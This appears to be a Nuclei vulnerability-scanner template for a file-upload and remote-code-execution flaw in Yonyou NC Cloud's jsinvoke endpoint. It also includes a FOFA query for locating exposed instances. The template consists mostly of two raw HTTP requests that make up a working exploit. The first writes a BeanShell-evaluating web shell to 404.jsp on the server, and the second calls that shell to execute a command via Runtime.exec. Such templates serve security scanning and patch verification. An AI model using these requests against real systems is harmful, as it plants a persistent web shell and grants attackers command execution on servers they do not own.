id: yonyou-nc-cloud-jsinvoke-rce

info:
  name: 用友 NC Cloud jsinvoke - rce
  author: leadlife
  severity: critical
  description: An arbitrary file upload vulnerability in the Yonyou NC-Cloud system. Attackers can upload any files to the server and upload web shells, thereby gaining command execution privileges on the server.
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B%20NC%20Cloud%20jsinvoke%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: app="用友-NC-Cloud"
  tags: yonyou,fileupload,nccloud,oa

http:
  - raw:
      - |
        POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: cookiets=168170496; JSESSIONID=33A343770FF.server
        If-None-Match: W/"1571-1589211696000"
        If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 249

        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/404.jsp"]}

      
      - |
        POST /404.jsp?error=bsh.Interpreter HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: cookiets=1681785232226; JSESSIONID=334D3ED07A343770FF.server
        If-None-Match: W/"1571-1589211696000"
        If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 104

        cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("echo {{randstr}}").getInputStream())

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 || status_code_1 == 500
          - status_code_2 == 200 && contains(body_2,"{{randstr}}")
        condition: and


